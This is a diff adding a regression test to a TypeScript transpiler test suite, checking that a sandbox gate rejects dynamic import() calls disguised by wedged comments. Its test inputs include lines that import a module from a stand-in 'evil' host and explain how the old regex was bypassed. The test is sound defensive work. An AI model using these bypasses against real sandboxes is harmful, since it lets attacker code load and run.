@@ -250,6 +250,67 @@ async function runTests(): Promise<void> {
         }
     }
 
+    /* (f) dynamic import() with a WEDGED COMMENT is still rejected -----------
+     * SEC-31/SEC-04 regression. Sucrase preserves comments, so the pre-fix gate
+     * `/(^|[^.\w])import\s*\(/` (whose `\s*` can't match a comment) let
+     * `import/**\/('https://evil/m.js')` slip through to a real module loader.
+     * The comment-neutralizing scan must now catch it. This assertion FAILS on
+     * the pre-fix code (the snippet transpiles to { js }, no error) and PASSES
+     * after. `_transform: id` preserves the comment so the gate sees the escape.
+     */
+    {
+        const id = (s: string): string => s;
+        const wedged = await transpile(`import/**/('https://evil/m.js');`, {
+            _transform: id,
+        });
+        assert(
+            '(f) comment-wedged dynamic import → { error } (not passed through)',
+            'error' in wedged,
+            wedged,
+        );
+        if ('error' in wedged) {
+            assert(
+                "(f) error.phase === 'transpile'",
+                wedged.error.phase === 'transpile',
+                wedged.error,
+            );
+        }
+
+        // Sibling variants an attacker might reach for: a line comment + newline,
+        // and a multi-token gap. Both must reject too.
+        const blockGap = await transpile(
+            `const m = import /* x */ ('https://evil/m.js');`,
+            { _transform: id },
+        );
+        assert(
+            '(f) block-comment gap dynamic import → { error }',
+            'error' in blockGap,
+            blockGap,
+        );
+
+        // A NON-dynamic member access named `import` (e.g. `foo.import(x)`) or a
+        // string that merely CONTAINS "import(" must NOT be falsely rejected —
+        // the neutralizer blanks string bodies and the `[^.\w]` guard skips
+        // member access, so these still transpile to { js }.
+        const memberOk = await transpile(`foo.import('x');`, {
+            _transform: id,
+        });
+        assert(
+            '(f) member `.import(` is NOT rejected',
+            'js' in memberOk,
+            memberOk,
+        );
+        const stringOk = await transpile(
+            `const s = "not an import('x') call";`,
+            { _transform: id },
+        );
+        assert(
+            '(f) `import(` inside a string is NOT rejected',
+            'js' in stringOk,
+            stringOk,
+        );
+    }
+
     /* Summary --------------------------------------------------------------- */
     console.log(`\n${passed} passed, ${failed} failed\n`);
 
